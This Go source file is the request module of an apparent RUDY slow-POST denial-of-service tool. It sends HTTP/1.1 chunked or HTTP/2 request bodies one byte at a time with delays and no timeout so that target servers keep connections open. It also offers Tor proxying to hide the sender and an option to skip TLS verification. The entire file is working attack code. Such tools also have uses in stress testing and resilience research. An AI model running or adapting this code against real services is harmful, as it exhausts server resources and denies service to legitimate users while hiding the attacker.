// Package request handles the request lifetime.
package request

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/darkweak/rudy/logger"
	"golang.org/x/net/http2"
)

// Protocol selects the HTTP version used for the slow request.
type Protocol string

const (
	// ProtocolHTTP1 forces HTTP/1.1 with chunked transfer encoding (classic RUDY).
	ProtocolHTTP1 Protocol = "http1"
	// ProtocolHTTP2 forces HTTP/2 over TLS (ALPN h2).
	ProtocolHTTP2 Protocol = "http2"
	// ProtocolH2C forces cleartext HTTP/2 (h2c)
	ProtocolH2C Protocol = "h2c"
)

// Options configures a slow request.
type Options struct {
	Size     int64
	URL      string
	Delay    time.Duration
	Method   string
	Headers  []string
	Protocol Protocol
	// Insecure skips TLS certificate verification (lab / self-signed only).
	Insecure bool
	// Tor is an optional socks5 proxy endpoint (honored for http1).
	Tor string
}

type request struct {
	client      *http.Client
	delay       time.Duration
	payloadSize int64
	req         *http.Request
	protocol    Protocol
	insecure    bool
}

// Request is a wrapper around a slow HTTP request session.
type Request interface {
	WithTor(endpoint string) *request
	Send() error
}

// NewRequest creates the request with protocol-specific framing.
func NewRequest(opts Options) Request {
	proto := opts.Protocol
	if proto == "" {
		proto = ProtocolHTTP1
	}

	req, _ := http.NewRequestWithContext(context.Background(), opts.Method, opts.URL, nil)
	req.Header = make(http.Header)

	for _, h := range opts.Headers {
		name, value, ok := strings.Cut(h, ":")
		if !ok {
			continue
		}

		req.Header.Set(strings.TrimSpace(name), strings.TrimSpace(value))
	}

	switch proto {
	case ProtocolHTTP2, ProtocolH2C:
		// HTTP/2 has no chunked TE. Announce Content-Length and drip DATA frames.
		req.ContentLength = opts.Size
		req.Proto = "HTTP/2.0"
		req.ProtoMajor = 2
		req.ProtoMinor = 0
	default:
		// Classic RUDY: HTTP/1.1 + chunked body, one byte at a time.
		req.Proto = "HTTP/1.1"
		req.ProtoMajor = 1
		req.ProtoMinor = 1
		req.TransferEncoding = []string{"chunked"}
		req.ContentLength = -1
	}

	r := &request{
		delay:       opts.Delay,
		payloadSize: opts.Size,
		req:         req,
		protocol:    proto,
		insecure:    opts.Insecure,
	}
	r.client = &http.Client{
		Transport: r.buildTransport(opts.Tor),
		// No overall timeout: the point is to keep the stream/connection open.
		Timeout: 0,
	}

	return r
}

func (r *request) tlsConfig() *tls.Config {
	return &tls.Config{
		InsecureSkipVerify: r.insecure,
		NextProtos:         []string{http2.NextProtoTLS},
	}
}

func (r *request) buildTransport(torEndpoint string) http.RoundTripper {
	var proxy func(*http.Request) (*url.URL, error)

	if torEndpoint != "" {
		torProxy, err := url.Parse(torEndpoint)
		if err != nil {
			panic("Failed to parse proxy URL:" + err.Error())
		}

		proxy = http.ProxyURL(torProxy)
	}

	switch r.protocol {
	case ProtocolHTTP2:
		// One http2.Transport per session ⇒ separate TCP+TLS connections per concurrent.
		return &http2.Transport{
			TLSClientConfig: r.tlsConfig(),
		}
	case ProtocolH2C:
		return &http2.Transport{
			AllowHTTP: true,
			// DialTLSContext is the dial hook even for cleartext when AllowHTTP is set.
			DialTLSContext: func(ctx context.Context, network, addr string, _ *tls.Config) (net.Conn, error) {
				var d net.Dialer

				return d.DialContext(ctx, network, addr)
			},
		}
	default:
		return &http.Transport{
			Proxy:           proxy,
			TLSClientConfig: r.tlsConfig(),
			// Disable HTTP/2 so we stay on HTTP/1.1 chunked RUDY.
			TLSNextProto: map[string]func(string, *tls.Conn) http.RoundTripper{},
		}
	}
}

// WithTor attaches a TOR socks proxy (HTTP/1 path). Prefer Options.Tor at construction.
func (r *request) WithTor(endpoint string) *request {
	r.client.Transport = r.buildTransport(endpoint)

	return r
}

func (r *request) Send() error {
	pipeReader, pipeWriter := io.Pipe()
	r.req.Body = pipeReader
	closerChan := make(chan struct{})

	defer close(closerChan)

	go func() {
		buf := make([]byte, 1)
		// Payload buffer of the requested size; read one byte at a time.
		payload := bytes.NewReader(make([]byte, r.payloadSize))

		defer func() {
			_ = pipeWriter.Close()
		}()

		for {
			select {
			case <-closerChan:
				return
			default:
				n, err := payload.Read(buf)
				if n == 0 || err != nil {
					return
				}

				_, werr := pipeWriter.Write(buf[:n])
				if werr != nil {
					return
				}

				logger.Logger.Sugar().Infof(
					"Sent 1 byte of %d to %s (%s)",
					r.payloadSize,
					r.req.URL,
					r.protocol,
				)
				time.Sleep(r.delay)
			}
		}
	}()

	res, err := r.client.Do(r.req)
	if err != nil {
		err = fmt.Errorf("an error occurred during the request: %w", err)
		logger.Logger.Sugar().Error(err)

		return err
	}

	defer func() {
		_, _ = io.Copy(io.Discard, res.Body)
		_ = res.Body.Close()
	}()

	logger.Logger.Sugar().Infof(
		"Response from %s: %s (proto %s)",
		r.req.URL,
		res.Status,
		res.Proto,
	)

	return nil
}
